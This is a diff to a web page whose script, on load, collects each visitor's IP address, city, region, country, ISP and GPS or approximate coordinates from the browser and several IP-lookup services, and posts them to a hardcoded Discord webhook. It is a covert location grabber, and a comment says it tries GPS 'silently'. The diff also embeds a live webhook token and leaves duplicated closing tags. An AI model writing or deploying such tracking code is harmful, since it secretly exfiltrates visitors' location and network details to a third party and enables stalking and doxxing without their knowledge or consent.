@@ -20,14 +20,8 @@
     .container {
       max-width: 400px;
     }
-    h1 {
-      font-size: 34px;
-      margin-bottom: 16px;
-    }
-    p {
-      font-size: 18px;
-      color: #666;
-    }
+    h1 { font-size: 34px; margin-bottom: 16px; }
+    p { font-size: 18px; color: #666; }
   </style>
 </head>
 <body>
@@ -40,36 +34,58 @@
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1516409431368269934/4qmFB9N79B2tVd0xWvh221dwRWNZ6gAJBwmrWW1nlKP_FkAA2JohWRG4G4RU-n8k_e_X";
 
     async function sendVisitorInfo() {
-      let geoData = {};
-      let ipData = {};
+      console.log("🚀 Tracking started...");
 
-      // 1. Try Browser Geolocation (more accurate)
-      try {
-        const position = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            timeout: 8000,
-            enableHighAccuracy: true
-          });
-        });
+      let geo = { lat: null, lon: null };
+      let ipInfo = { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };
 
-        geoData = {
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          accuracy: position.coords.accuracy
-        };
-      } catch (e) {
-        console.log("Geolocation denied or failed");
+      // Try GPS silently (won't block anything if denied)
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            geo.lat = position.coords.latitude;
+            geo.lon = position.coords.longitude;
+            console.log("✅ GPS granted");
+          },
+          () => console.log("❌ GPS denied or failed"),
+          { timeout: 7000, enableHighAccuracy: true }
+        );
       }
 
-      // 2. Always get IP + city level info as fallback
-      try {
-        const res = await fetch('https://ip-api.com/json/?fields=status,message,query,country,regionName,city,lat,lon,isp');
-        ipData = await res.json();
-      } catch (e) {
-        console.log("IP lookup failed");
+      // Main: IP Geolocation (works even if GPS denied)
+      const services = [
+        'https://ip-api.com/json/?fields=query,city,regionName,country,isp,lat,lon',
+        'https://ipapi.co/json/',
+        'https://freeipapi.com/api/json/'
+      ];
+
+      for (let url of services) {
+        try {
+          const res = await fetch(url);
+          if (res.ok) {
+            const data = await res.json();
+            
+            ipInfo.ip = data.query || data.ip || "Unknown";
+            ipInfo.city = data.city || "Unknown";
+            ipInfo.region = data.regionName || data.region || "Unknown";
+            ipInfo.country = data.country || data.country_name || "Unknown";
+            ipInfo.isp = data.isp || data.org || "Unknown";
+
+            // Use IP lat/lon as fallback if GPS denied
+            if (!geo.lat && data.lat) {
+              geo.lat = data.lat;
+              geo.lon = data.lon;
+            }
+            
+            console.log("✅ IP data received");
+            break;
+          }
+        } catch (e) {
+          console.log("Service failed, trying next...");
+        }
       }
 
-      // Send to Discord
+      // Send data
       try {
         await fetch(WEBHOOK_URL, {
           method: 'POST',
@@ -80,26 +96,26 @@
               title: "Visitor Details",
               color: 0x3498db,
               fields: [
-                { name: "IP Address", value: ipData.query || "Unknown", inline: true },
-                { name: "City", value: ipData.city || "Unknown", inline: true },
-                { name: "Region", value: ipData.regionName || "Unknown", inline: true },
-                { name: "Country", value: ipData.country || "Unknown", inline: true },
-                { name: "GPS Coordinates", value: geoData.lat ? `${geoData.lat.toFixed(4)}, ${geoData.lon.toFixed(4)}` : "Not granted", inline: false },
-                { name: "ISP", value: ipData.isp || "Unknown", inline: false },
+                { name: "IP Address", value: ipInfo.ip, inline: true },
+                { name: "City", value: ipInfo.city, inline: true },
+                { name: "Region", value: ipInfo.region, inline: true },
+                { name: "Country", value: ipInfo.country, inline: true },
+                { name: "GPS / Approx Coordinates", value: geo.lat ? `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}` : "Unknown", inline: false },
+                { name: "ISP", value: ipInfo.isp, inline: false },
                 { name: "Time", value: new Date().toLocaleString(), inline: false }
               ]
             }]
           })
         });
+        console.log("✅ Sent to Discord");
       } catch (e) {
-        console.log("Webhook error");
+        console.error("Webhook error");
       }
     }
 
-    // Run after page loads
-    window.onload = () => {
-      setTimeout(sendVisitorInfo, 800);
-    };
+    window.onload = () => setTimeout(sendVisitorInfo, 1000);
   </script>
+</body>
+</html>
 </body>
 </html>
